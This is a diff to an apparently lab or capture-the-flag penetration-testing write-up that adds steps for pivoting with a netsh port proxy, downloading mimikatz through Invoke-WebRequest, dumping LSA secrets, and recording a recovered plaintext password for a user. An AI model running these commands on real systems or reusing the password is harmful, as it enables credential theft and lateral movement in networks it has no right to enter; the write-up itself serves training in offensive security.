@@ -147,6 +147,22 @@ Were the lister port and listener adress are from our attacking machine, and the
 Using the same logic, we use:
 
 ```
-netsh.exe interface portproxy add v4tov4 listenport=8101 listenaddress=172.16.5.50 connectport=8100 connectaddress=10.10.14.221
+netsh.exe interface portproxy add v4tov4 listenport=8001 listenaddress=172.16.6.100 connectport=8000 connectaddress=10.10.14.221
 ```
+
+And now we transfer the needed tools throught powershell using `Invoke-WebRequest`
+
+```
+Invoke-WebRequest http://172.16.6.100:8001/mimikatz.exe -OutFile mimikatz.exe
+```
+
+#### To dump the lsa secrets using mimikatz
+
+```
+.\mimikatz.exe
+token::elevate
+lsadump::secrets
+```
+
+And the password for the user tpetty is Sup3rS3cur3D0m@inU2eR
 
